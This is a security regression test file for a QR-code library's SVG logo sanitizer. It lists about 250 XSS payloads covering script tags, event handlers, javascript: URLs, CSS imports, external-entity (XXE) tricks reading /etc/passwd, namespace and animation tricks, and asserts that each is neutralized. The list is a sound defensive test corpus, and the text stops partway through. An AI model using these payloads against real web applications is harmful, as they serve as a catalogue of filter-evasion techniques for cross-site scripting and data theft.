// Security regression tests for SVG logos (XSS through a malicious logo).
//
// Every attack below is pushed through the real output path, renderSvg(),
// and must come out blocked (refused with a RangeError) or harmless. Two
// layers are checked separately:
//   1. the outer QR document never contains logo markup, only an
//      <image href="data:image/svg+xml;base64,..."> element;
//   2. the embedded logo document itself has been sanitized.
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { encode } from '../src/core/qr.js';
import { planLogo } from '../src/render/logo.js';
import { renderSvg } from '../src/render/svg.js';
import { sanitizeSvg, embedSvgLogo } from '../src/render/svg-sanitize.js';

const qr = encode('logo security', { ecc: 'H' });
const plan = planLogo(qr.matrix, { sizePercent: 20 });
const render = (logoSvg) => renderSvg(plan.matrix, { logo: { svg: logoSvg, box: plan.box, area: plan.area } });

const NS = 'xmlns="http://www.w3.org/2000/svg"';
const XLINK = 'xmlns:xlink="http://www.w3.org/1999/xlink"';
const svg = (body, rootAttributes = '') => `<svg ${NS} ${XLINK} viewBox="0 0 10 10"${rootAttributes}>${body}</svg>`;
const ESC = String.fromCharCode(0x1b);

/**
 * Attack payloads. Markers: every script calls alert(...), every remote
 * reference points at evil.example. `text: true` marks the few payloads
 * whose marker may legitimately survive as inert, escaped character data
 * (text content or the value of a harmless attribute); the structural
 * checks still apply to them.
 */
const ATTACKS = {
  '<script> in all forms': [
    svg('<script>alert(1)</script>'),
    svg('<script type="text/javascript">alert(1)</script>'),
    svg('<script type="text/ecmascript"><![CDATA[alert(1)]]></script>'),
    svg('<script href="https://evil.example/x.js"/>'),
    svg('<script xlink:href="https://evil.example/x.js"></script>'),
    svg('<script src="https://evil.example/x.js"></script>'),
    svg('<SCRIPT>alert(1)</SCRIPT>'),
    svg('<ScRiPt>alert(1)</ScRiPt>'),
    svg('<script\n>alert(1)</script\n>'),
    svg('<script\t>alert(1)</script >'),
    svg('<script >alert(1)</script >'),
    svg('<script/x>alert(1)</script>'),
    svg('<script>alert(1)</script foo="bar">'),
    svg('<script>alert(1)'),
    svg('<g><g><script>alert(1)</script></g></g>'),
    svg('<scr<script>ipt>alert(1)</scr</script>ipt>'),
    svg('<scr<script></script>ipt>alert(1)</scr<script></script>ipt>'),
    svg('<<script>script>alert(1)<</script>/script>'),
    svg('<script><!-- </script> -->alert(1)</script>'),
    svg('<!-- --><script>alert(1)</script><!-- -->'),
    svg('<!-- <script>alert(1)</script>'),
    svg('<defs><script>alert(1)</script></defs>'),
    svg('<svg><script>alert(1)</script></svg>'),
    svg('<title><script>alert(1)</script></title>'),
    svg('<style><script>alert(1)</script></style>'),
    svg('<script>alert(1)</script>', ' onload="alert(2)"'),
    `<svg ${NS}><script>alert(1)</script></svg><script>alert(2)</script>`,
    `<script>alert(1)</script><svg ${NS}></svg>`,
    `<svg ${NS}></svg><svg ${NS}><script>alert(1)</script></svg>`,
    '<svg xmlns="http://www.w3.org/2000/svg"\n><script\n>alert(1)</script\n></svg\n>',
  ],
  'event handlers': [
    svg('<circle r="5" onclick="alert(1)"/>'),
    svg('<circle r="5" onload="alert(1)"/>'),
    svg('<image href="#x" onerror="alert(1)"/>'),
    svg('<circle r="5" ONLOAD="alert(1)"/>'),
    svg('<circle r="5" oNlOaD="alert(1)"/>'),
    svg("<circle r='5' onload='alert(1)'/>"),
    svg('<circle r="5" onload = "alert(1)"/>'),
    svg('<circle r="5"\nonload\n=\n"alert(1)"/>'),
    svg('<circle r="5"\tonload="alert(1)"/>'),
    svg('<circle r="5"\ronload="alert(1)"/>'),
    svg('<circle r="5"\fonload="alert(1)"/>'),
    svg('<circle r="5"/onload="alert(1)"/>'),
    svg('<circle r="5"onload="alert(1)"/>'),
    svg('<circle r="5" onload=alert(1) />'),
    svg('<circle r="5" onload=alert(1)>'),
    svg('<circle r="5" onload=`alert(1)`/>'),
    svg('<circle r="5" onload="alert(1)" onload="alert(2)"/>'),
    svg('<circle r="5" ononloadload="alert(1)"/>'),
    svg('<circle r="5" on onload="alert(1)"load="x"/>'),
    svg('<circle r="5" x="1" onfocus="alert(1)" tabindex="0"/>'),
    svg('<circle r="5" onbegin="alert(1)"/>'),
    svg('<animate attributeName="x" onbegin="alert(1)" onend="alert(2)" onrepeat="alert(3)"/>'),
    svg('<circle r="5" title=">" onload="alert(1)"/>'),
    svg('<circle r="5" title="\'" onload="alert(1)" data-x="\'"/>'),
    svg('<circle r="5" onload="&#97;lert(1)"/>'),
    svg('<circle r="5" &#111;nload="alert(1)"/>'),
    svg('<circle r="5" on\u0000load="alert(1)"/>'),
    svg('<circle r="5" xlink:onload="alert(1)"/>'),
    svg('<circle r="5" onload\u00a0="alert(1)"/>'),
    svg('', ' onload="alert(1)" onerror="alert(2)"'),
    `<svg ${NS} onload="alert(1)"/>`,
  ],
  'javascript: and data: URLs in href / xlink:href': [
    svg('<a href="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a xlink:href="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="JaVaScRiPt:alert(1)"><circle r="5"/></a>'),
    svg('<a href=" javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="java\tscript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="java\nscript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="java&#9;script:alert(1)"><circle r="5"/></a>'),
    svg('<a href="java&#x0A;script:alert(1)"><circle r="5"/></a>'),
    svg('<a href="&#x1;javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="&#106;avascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="&#x6A;&#x61;&#x76;&#x61;script:alert(1)"><circle r="5"/></a>'),
    svg('<a href="&#0000106;avascript&#58;alert(1)"><circle r="5"/></a>'),
    svg('<a href="javascript&colon;alert(1)"><circle r="5"/></a>'),
    svg("<a href='javascript:alert(1)'><circle r='5'/></a>"),
    svg('<a href=javascript:alert(1)><circle r="5"/></a>'),
    svg('<a HREF="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a XLINK:HREF="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="#ok" href="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="#" xlink:href="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="vbscript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="jav&#x61;script:alert(1)"><circle r="5"/></a>'),
    svg('<a href="javajavascript:script:alert(1)"><circle r="5"/></a>'),
    svg('<a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"><circle r="5"/></a>'),
    svg('<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><circle r="5"/></a>'),
    svg('<a href="DATA:text/html,alert(1)"><circle r="5"/></a>'),
    svg('<a href="data:image/svg+xml,&lt;svg onload=\'alert(1)\'/&gt;"><circle r="5"/></a>'),
    svg('<image href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+"/>'),
    svg('<image href="data:image/svg+xml,&lt;svg xmlns=\'http://www.w3.org/2000/svg\' onload=\'alert(1)\'/&gt;"/>'),
    svg('<image xlink:href="data:image/png;base64,AAAA&quot; onload=&quot;alert(1)"/>'),
    svg('<image href="data:image/png;base64,AAAA,javascript:alert(1)"/>'),
    svg('<image href="data:text/html;image/png;base64,alert(1)"/>'),
    svg('<image href="https://evil.example/track.gif"/>'),
    svg('<image href="//evil.example/track.gif"/>'),
    svg('<image href="\\\\evil.example\\share\\x.png"/>'),
    svg('<image href="file:///etc/passwd?evil.example"/>'),
    svg('<feImage href="https://evil.example/x.png"/>'),
    svg('<a href="https://evil.example/phish"><circle r="5"/></a>'),
  ],
  '<foreignObject>': [
    svg('<foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject>'),
    svg('<foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"/></foreignObject>'),
    svg('<foreignObject><img xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/x" onerror="alert(1)"/></foreignObject>'),
    svg('<FOREIGNOBJECT><div onclick="alert(1)">x</div></FOREIGNOBJECT>'),
    svg('<foreignobject><div onclick="alert(1)">x</div></foreignobject>'),
    svg('<foreignObject\n width="1"><p onclick="alert(1)">x</p></foreignObject\n>'),
    svg('<foreignObject/><div onclick="alert(1)">x</div>'),
    svg('<foreignObject><foreignObject></foreignObject><p onclick="alert(1)">x</p></foreignObject>'),
    svg('<foreign<foreignObject></foreignObject>Object><p onclick="alert(1)">x</p></foreignObject>'),
    svg('<foreignObject><p onclick="alert(1)">x</p>'),
    svg('<iframe src="javascript:alert(1)"/>'),
    svg('<iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/"/>'),
    svg('<embed xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/x.svg"/>'),
    svg('<object xmlns="http://www.w3.org/1999/xhtml" data="https://evil.example/x.svg"/>'),
    svg('<img xmlns="http://www.w3.org/1999/xhtml" src="x" onerror="alert(1)"/>'),
    svg('<body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"/>'),
    svg('<video xmlns="http://www.w3.org/1999/xhtml"><source onerror="alert(1)"/></video>'),
    svg('<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler>'),
    svg('<math xmlns="http://www.w3.org/1998/Math/MathML"><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>'),
  ],
  '<use> pointing to external resources': [
    svg('<use href="https://evil.example/sprite.svg#x"/>'),
    svg('<use xlink:href="https://evil.example/sprite.svg#x"/>'),
    svg('<use href="//evil.example/sprite.svg#x"/>'),
    svg('<use href="other.svg#evil.example"/>'),
    svg('<use href="data:image/svg+xml,&lt;svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;#x"/>'),
    svg('<use href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgb25sb2FkPSJhbGVydCgxKSIvPg==#x"/>'),
    svg('<use href="data:image/png;base64,AAAA"/>'),
    svg('<use href="javascript:alert(1)"/>'),
    svg('<use href="#a" xlink:href="https://evil.example/s.svg#x"/>'),
    svg('<use href=" https://evil.example/s.svg#x"/>'),
    svg('<use href="&#104;ttps://evil.example/s.svg#x"/>'),
    svg('<use href="#x https://evil.example/"/>'),
    svg('<use xml:base="https://evil.example/" href="#x"/>'),
    svg('<g xml:base="https://evil.example/s.svg"><use href="#x"/></g>'),
    svg('<textPath href="https://evil.example/s.svg#p">x</textPath>'),
    svg('<mpath xlink:href="https://evil.example/s.svg#p"/>'),
    svg('<linearGradient id="g" href="https://evil.example/s.svg#g"/>'),
    svg('<pattern id="p" xlink:href="https://evil.example/s.svg#p"/>'),
    svg('<filter id="f"><feImage xlink:href="https://evil.example/s.svg#f"/></filter>'),
  ],
  '<style> with url() or @import': [
    svg('<style>@import url("https://evil.example/a.css");</style>'),
    svg('<style>@import "https://evil.example/a.css";</style>'),
    svg("<style>@import 'https://evil.example/a.css'</style>"),
    svg('<style>@IMPORT URL(https://evil.example/a.css);</style>'),
    svg('<style>@im@import x;port url(https://evil.example/a.css);</style>'),
    svg('<style>@import/**/url(https://evil.example/a.css);</style>'),
    svg('<style>@im/**/port "https://evil.example/a.css";</style>'),
    svg('<style>@\\69mport "https://evil.example/a.css";</style>'),
    svg('<style>@\\000069mport url(https://evil.example/a.css);</style>'),
    svg('<style>rect{fill:url(https://evil.example/p.png)}</style>'),
    svg('<style>rect{fill:url( "https://evil.example/p.png" )}</style>'),
    svg("<style>rect{fill:url('https://evil.example/p.png')}</style>"),
    svg('<style>rect{fill:URL(https://evil.example/p.png)}</style>'),
    svg('<style>rect{fill:u\\72l(https://evil.example/p.png)}</style>'),
    svg('<style>rect{fill:\\75rl(https://evil.example/p.png)}</style>'),
    svg('<style>rect{fill:url(//evil.example/p.png)}</style>'),
    svg('<style>rect{fill:url(#a) url(https://evil.example/p.png)}</style>'),
    svg('<style>rect{fill:ururl(#x)l(https://evil.example/p.png)}</style>'),
    svg('<style>rect{fill:url(https://evil.example/p.png</style>'),
    svg('<style>rect{fill:url("https://evil.example/a)b.png")}</style>'),
    svg('<style>rect{background:image-set("https://evil.example/p.png" 1x)}</style>'),
    svg('<style>rect{background:image("https://evil.example/p.png")}</style>'),
    svg('<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}</style>'),
    svg('<style>rect{behavior:url(https://evil.example/x.htc)}</style>'),
    svg('<style>rect{width:expression(alert(1))}</style>'),
    svg('<style>rect{-moz-binding:url("https://evil.example/x.xml#x")}</style>'),
    svg('<style>rect{fill:url(javascript:alert(1))}</style>'),
    svg('<style>rect{fill:url(data:image/svg+xml,alert(1))}</style>'),
    svg('<style><![CDATA[@import url(https://evil.example/a.css);]]></style>'),
    svg('<style>@imp<![CDATA[ort url(https://evil.]]>example/a.css);</style>'),
    svg('<style>@imp<!-- -->ort url(https://evil.<!-- -->example/a.css);</style>'),
    svg('<style>&#64;import url(https://evil.example/a.css);</style>'),
    svg('<style>&#x40;import &#x75;rl(https://evil.example/a.css);</style>'),
    svg('<style>rect{fill:&#117;rl(https://evil&#46;example/p.png)}</style>'),
    svg('<style>&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</style>'),
    svg('<style></style><script>alert(1)</script><style></style>'),
    svg('<style type="text/css" media="all">@import url(https://evil.example/a.css);</style>'),
    svg('<rect style="fill:url(https://evil.example/p.png)"/>'),
    svg('<rect style="fill:u\\72l(https://evil.example/p.png)"/>'),
    svg('<rect style="background:url(&quot;https://evil.example/p.png&quot;)"/>'),
    svg('<rect style="background:url(&#39;javascript:alert(1)&#39;)"/>'),
    svg('<rect style="width:expression(alert(1))"/>'),
    svg('<rect fill="url(https://evil.example/p.svg#g)"/>'),
    svg('<rect fill="url( \'https://evil.example/p.svg#g\' )"/>'),
    svg('<rect fill="u\\72l(https://evil.example/p.svg#g)"/>'),
    svg('<rect filter="url(https://evil.example/f.svg#f)" mask="url(//evil.example/m.svg#m)" clip-path="url(https://evil.example/c.svg#c)"/>'),
    svg('<rect marker-start="url(&#x68;ttps://evil.example/m.svg#m)"/>'),
    svg('<rect cursor="url(https://evil.example/c.cur), auto"/>'),
    '<?xml-stylesheet href="https://evil.example/a.css" type="text/css"?>' + svg('<rect/>'),
    '<?xml-stylesheet type="text/xsl" href="data:text/xml,alert(1)"?>' + svg('<rect/>'),
  ],
  CDATA: [
    svg('<script><![CDATA[alert(1)]]></script>'),
    { markup: svg('<![CDATA[<script>alert(1)</script>]]>'), text: true },
    { markup: svg('<text><![CDATA[<script>alert(1)</script>]]></text>'), text: true },
    { markup: svg('<text><![CDATA[</text><script>alert(1)</script><text>]]></text>'), text: true },
    { markup: svg('<title><![CDATA[<img src=x onerror=alert(1)>]]></title>'), text: true },
    svg('<![CDATA[]]><script>alert(1)</script>'),
    svg('<scr<![CDATA[]]>ipt>alert(1)</scr<![CDATA[]]>ipt>'),
    svg('<![CDATA[ <script>alert(1)</script>'),
    svg('<![CDATA[ ]]]]><![CDATA[>]]><script>alert(1)</script>'),
    svg('<a href="java<![CDATA[]]>script:alert(1)"><circle r="5"/></a>'),
    svg('<circle r="5" on<![CDATA[]]>load="alert(1)"/>'),
    svg('<!--<![CDATA[--><script>alert(1)</script><!--]]>-->'),
    svg('<![CDATA[<!--]]><script>alert(1)</script><![CDATA[-->]]>'),
  ],
  'entity tricks': [
    `<!DOCTYPE svg [<!ENTITY x "javascript:alert(1)">]>${svg('<a href="&x;"><circle r="5"/></a>')}`,
    `<!DOCTYPE svg [<!ENTITY x "<script>alert(1)</script>">]>${svg('&x;')}`,
    `<!DOCTYPE svg [<!ENTITY x "alert(1)">]>${svg('<circle r="5" onload="&x;"/>')}`,
    `<!DOCTYPE svg [<!ENTITY x SYSTEM "https://evil.example/x.txt">]>${svg('<text>&x;</text>')}`,
    `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>${svg('<text>&x; evil.example</text>')}`,
    `<!DOCTYPE svg [<!ENTITY % p SYSTEM "https://evil.example/x.dtd"> %p;]>${svg('<rect/>')}`,
    `<!DOCTYPE svg SYSTEM "https://evil.example/x.dtd">${svg('<rect/>')}`,
    `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "https://evil.example/x.dtd">${svg('<rect/>')}`,
    `<!DOCTYPE svg [<!ENTITY a "]>"><!ENTITY x "<script>alert(1)</script>">]>${svg('&x;')}`,
    `<!DOCTYPE svg [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>${svg('<text>&lol3; alert(1)</text>')}`,
    `<!DOCTYPE svg [<!ENTITY lt "<script>alert(1)</script>">]>${svg('<text>&lt;</text>')}`,
    `<!DOCTYPE svg [<!ATTLIST circle onload CDATA "alert(1)">]>${svg('<circle r="5"/>')}`,
    `<!DOCTYPE svg [<!ATTLIST a xlink:href CDATA "javascript:alert(1)">]>${svg('<a><circle r="5"/></a>')}`,
    `<!DOCTYPE svg [<!ENTITY x "x"> <!-- > --> <!ENTITY y "<script>alert(1)</script>">]>${svg('&y;')}`,
    svg('<!DOCTYPE svg [<!ENTITY x "<script>alert(1)</script>">]>&x;'),
    { markup: svg('<text>&#60;script&#62;alert(1)&#60;/script&#62;</text>'), text: true },
    { markup: svg('<text>&lt;script&gt;alert(1)&lt;/script&gt;</text>'), text: true },
    { markup: svg('<text>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</text>'), text: true },
    { markup: svg('&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'), text: true },
    { markup: svg('<circle r="5" title="&quot; onload=&quot;alert(1)"/>'), text: true },
    { markup: svg('<circle r="5" title="&#34; onload=&#34;alert(1)&#34; x=&#34;"/>'), text: true },
    { markup: svg('<circle r="5" title="&#x22;&#x3E;&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"/>'), text: true },
    { markup: svg('<circle r="5" title="&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/>'), text: true },
    svg('<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)"><circle r="5"/></a>'),
    svg('<a href="&amp;#106;avascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="javascript&#58;alert(1)"><circle r="5"/></a>'),
    svg('<a href="&#0;javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="&#xD800;javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="&Tab;javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a href="&NewLine;java&NewLine;script:alert(1)"><circle r="5"/></a>'),
    svg('<&#115;cript>alert(1)</&#115;cript>'),
    { markup: svg('&#60;script>alert(1)&#60;/script>'), text: true },
  ],
  '<animate> / <set> changing href to javascript:': [
    svg('<a href="#x"><set attributeName="href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><set attributeName="xlink:href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animate attributeName="href" values="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animate attributeName="xlink:href" from="#x" to="javascript:alert(1)" dur="1s"/><circle r="5"/></a>'),
    svg('<a href="#x"><animate attributeName="href" values="#a;javascript:alert(1);#b" dur="1s" repeatCount="indefinite"/><circle r="5"/></a>'),
    svg('<a href="#x"><animate attributeName=" href " values="#a;#b"/><circle r="5"/></a>').replace('#a;#b', '#a;https://evil.example/'),
    svg('<a href="#x"><animate attributeName="HREF" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animate attributeName="h&#114;ef" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animate attributeName="x" to="java&#9;script:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animate attributeName="x" by="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><SET attributeName="href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><ANIMATE attributeName="href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animateTransform attributeName="href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animateMotion attributeName="xlink:href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><animateColor attributeName="href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a id="l" href="#x"><circle r="5"/></a><set href="#l" attributeName="href" to="javascript:alert(1)"/>'),
    svg('<a id="l" href="#x"><circle r="5"/></a><animate xlink:href="#l" attributeName="xlink:href" to="javascript:alert(1)" begin="0s" fill="freeze"/>'),
    svg('<use id="u" href="#x"/><set href="#u" attributeName="href" to="https://evil.example/s.svg#x"/>'),
    svg('<image id="i" href="#x"/><animate href="#i" attributeName="href" to="https://evil.example/t.gif"/>'),
    svg('<image id="i" href="#x"/><set href="#i" attributeName="href" to="data:image/svg+xml,alert(1)"/>'),
    svg('<circle r="5"><set attributeName="onclick" to="alert(1)"/></circle>'),
    svg('<circle r="5"><animate attributeName="onload" values="alert(1)"/></circle>'),
    svg('<a href="#x"><set attributeName="href" to="javascript:alert(1)"><desc>alert(2)</desc></set><circle r="5"/></a>'),
    svg('<a href="#x"><set\nattributeName\n=\n"href"\nto\n=\n"javascript:alert(1)"\n/><circle r="5"/></a>'),
    svg('<a href="#x"><set to="javascript:alert(1)" attributeName="href"/><circle r="5"/></a>'),
    svg('<a href="#x"><s<set/>et attributeName="href" to="javascript:alert(1)"/><circle r="5"/></a>'),
    svg('<a href="#x"><set attributeName="href" to="#y"/><set attributeName="xlink:href" to="//evil.example/"/><circle r="5"/></a>'),
  ],
  'namespace tricks': [
    svg('<svg:script xmlns:svg="http://www.w3.org/2000/svg">alert(1)</svg:script>'),
    svg('<x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script>'),
    svg('<x:script xmlns:x="http://www.w3.org/2000/svg" x:href="https://evil.example/x.js"/>'),
    `<svg ${NS} xmlns:s="http://www.w3.org/2000/svg"><s:script>alert(1)</s:script></svg>`,
    `<s:svg xmlns:s="http://www.w3.org/2000/svg"><s:script>alert(1)</s:script></s:svg>`,
    `<svg xmlns:a="http://www.w3.org/2000/svg" ${NS}><a:circle r="5" onload="alert(1)"/></svg>`,
    svg('<h:script xmlns:h="http://www.w3.org/1999/xhtml">alert(1)</h:script>'),
    svg('<h:body xmlns:h="http://www.w3.org/1999/xhtml" onload="alert(1)"/>'),
    svg('<h:iframe xmlns:h="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"/>'),
    svg('<h:img xmlns:h="http://www.w3.org/1999/xhtml" src="https://evil.example/x" onerror="alert(1)"/>'),
    svg('<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>'),
    svg('<g xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></g>'),
    svg('<div xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></div>'),
    svg('<a xmlns:x="http://www.w3.org/1999/xlink" x:href="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a xmlns:foo="http://www.w3.org/1999/xlink" foo:href="https://evil.example/"><circle r="5"/></a>'),
    svg('<use xmlns:xl="http://www.w3.org/1999/xlink" xl:href="https://evil.example/s.svg#x"/>'),
    svg('<a xmlns:xlink="http://evil.example/ns" xlink:href="javascript:alert(1)"><circle r="5"/></a>'),
    svg('<a xlink:href="#x" xmlns:xlink="https://evil.example/ns"><circle r="5"/></a>'),
    svg('<circle r="5" xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="click" ev:handler="javascript:alert(1)"/>'),
    svg('<ev:listener xmlns:ev="http://www.w3.org/2001/xml-events" event="click" handler="#h"/><handler id="h">alert(1)</handler>'),
    svg('<circle r="5" svg:onload="alert(1)" xmlns:svg="http://www.w3.org/2000/svg"/>'),
    svg('<circle r="5" x:onload="alert(1)" xmlns:x="http://www.w3.org/2000/svg"/>'),
    svg('<g xmlns="https://evil.example/ns"><circle r="5"/></g>'),
    svg('<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="https://evil.example/x.xml"/>'),
    svg('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><script>alert(1)</script></xsl:template></xsl:stylesheet>'),
    svg('<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><cc:Work xmlns:cc="http://creativecommons.org/ns#" rdf:about="https://evil.example/"/></rdf:RDF>'),
    svg('<a:b:script>alert(1)</a:b:script>'),
    svg('<:script>alert(1)</:script>'),
    svg('<script:>alert(1)</script:>'),
    `<svg xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></svg>`,
    `<svg><script xmlns="http://www.w3.org/2000/svg">alert(1)</script></svg>`,
    `<html xmlns="http://www.w3.org/1999/xhtml"><body onload="alert(1)"/></html>`,
  ],
};

const cases = [];
for (const [group, list] of Object.entries(ATTACKS)) {
  list.forEach((entry, index) => {
    const item = typeof entry === 'string' ? { markup: entry } : entry;
    cases.push({ group, label: `${group} #${index + 1}`, text: false, ...item });
  });
}

/** Everything a browser could act on, with the entity and whitespace disguises removed. */
function reveal(markup) {
  return markup
    .replace(/&#x([0-9a-f]+);?/gi, (m, hex) => String.fromCodePoint(Math.min(parseInt(hex, 16), 0x10ffff)))
    .replace(/&#([0-9]+);?/g, (m, dec) => String.fromCodePoint(Math.min(parseInt(dec, 10), 0x10ffff)))
    .replace(/&quot;/g, '"')
    .replace(/&apos;/g, "'");
}

/** Assert that a sanitized, standalone logo document carries nothing active. */
function assertInert(logo, { text }, label) {
  // Structure: every "<" opens or closes a known, unprefixed tag; attributes are all double-quoted.
  const tag = /<(\/?)([A-Za-z]+)((?:\s+[A-Za-z_][\w.:-]*="[^"<]*")*)\s*(\/?)>/g;
  const names = new Set();
  const attributes = [];
  const withoutTags = logo.replace(tag, (m, close, name, attrs) => {
    names.add(name);
    for (const a of attrs.matchAll(/\s+([A-Za-z_][\w.:-]*)="([^"<]*)"/g)) attributes.push({ element: name, name: a[1], value: reveal(a[2]) });
    return '';
  });
  assert.doesNotMatch(withoutTags, /</, `${label}: leftover "<" that is not a clean tag`);

  for (const name of names) {
    assert.doesNotMatch(name, /^(script|foreignobject|iframe|object|embed|handler|listener|body|html|img|div|video|math)$/i, `${label}: <${name}> survived`);
  }
  assert.doesNotMatch(logo, /<!|<\?|\]\]>/, `${label}: declaration, CDATA or processing instruction survived`);

  for (const { element, name, value } of attributes) {
    const compact = value.replace(/[\u0000- \u007f-\u009f]/g, '').toLowerCase();
    assert.doesNotMatch(name, /^on/i, `${label}: event handler ${name} survived`);
    if (name.includes(':')) {
      const rootNamespace = element === 'svg' && name === 'xmlns:xlink' && value === 'http://www.w3.org/1999/xlink';
      assert.ok(name === 'xlink:href' || rootNamespace, `${label}: prefixed attribute ${name} survived`);
    }
    if (name === 'xmlns') assert.equal(value, 'http://www.w3.org/2000/svg', `${label}: foreign default namespace`);
    else if (!name.startsWith('xmlns')) {
      assert.doesNotMatch(compact, /script:/, `${label}: script URL in ${name}`);
      assert.doesNotMatch(compact, /evil\.example|\/\/|\\/, `${label}: remote reference in ${name}`);
      if (/href$/i.test(name)) {
        assert.match(compact, /^(#[\w.:-]+|data:image\/(png|jpeg|gif|webp);base64,[a-z0-9+/]*={0,2})$/, `${label}: ${name}="${value}"`);
        if (compact.startsWith('data:')) assert.match(element, /^(image|feImage)$/, `${label}: data: URI on <${element}>`);
      } else {
        assert.doesNotMatch(compact, /data:/, `${label}: data: URL in ${name}`);
      }
      for (const url of compact.matchAll(/url\(([^)]*)\)?/g)) assert.match(url[1], /^#[\w.:-]+$/, `${label}: ${name} has ${url[0]}`);
      if ((element === 'set' || element.startsWith('animate')) && name.toLowerCase() === 'attributename') {
        assert.doesNotMatch(compact, /href$|^on/, `${label}: animation targets ${value}`);
      }
    }
  }

  // Text and CSS: whatever is left is character data. It must hold no CSS that loads anything.
  const data = reveal(withoutTags).toLowerCase();
  assert.doesNotMatch(data, /@import|url\s*\((?!#)|expression\s*\(|image-set|-moz-binding|behaviou?r\s*:|\\/, `${label}: active CSS survived`);
  if (!text) {
    assert.doesNotMatch(reveal(logo), /alert|evil\.example|javascript/i, `${label}: payload marker survived`);
  }
}

/** Pull the logo back out of a rendered QR code and check the outer document on the way. */
function extractLogo(output, label) {
  const images = [...output.matchAll(/<image href="data:image\/svg\+xml;base64,([A-Za-z0-9+/]+={0,2})" x="[\d.]+" y="[\d.]+" width="[\d.]+" height="[\d.]+" preserveAspectRatio="xMidYMid meet"\/>/g)];
  assert.equal(images.length, 1, `${label}: exactly one base64 <image>`);
  const outer = output.replace(images[0][0], '');
  // Without the image, the outer document is exactly what a logo-less render produces.
  assert.equal(outer, renderSvg(plan.matrix, { logo: { png: new Uint8Array([1]), box: plan.box, area: plan.area } }).replace(/ {2}<image [^>]*\/>/, '  '), `${label}: logo markup leaked into the outer document`);
  assert.doesNotMatch(output, /<script|<foreignObject|\son\w+\s*=|javascript:|alert|evil\.example|<!\[CDATA\[|<!ENTITY|<style|<use|<set|<animate/i, `${label}: outer document`);
  return Buffer.from(images[0][1], 'base64').toString('utf8');
}

describe('malicious SVG logos never reach the output as live markup', () => {
  test(`the corpus is large and covers every attack family (${cases.length} payloads)`, () => {
    assert.ok(cases.length >= 250, `only ${cases.length} payloads`);
    assert.deepEqual(Object.keys(ATTACKS), [
      '<script> in all forms',
      'event handlers',
      'javascript: and data: URLs in href / xlink:href',
      '<foreignObject>',
      '<use> pointing to external resources',
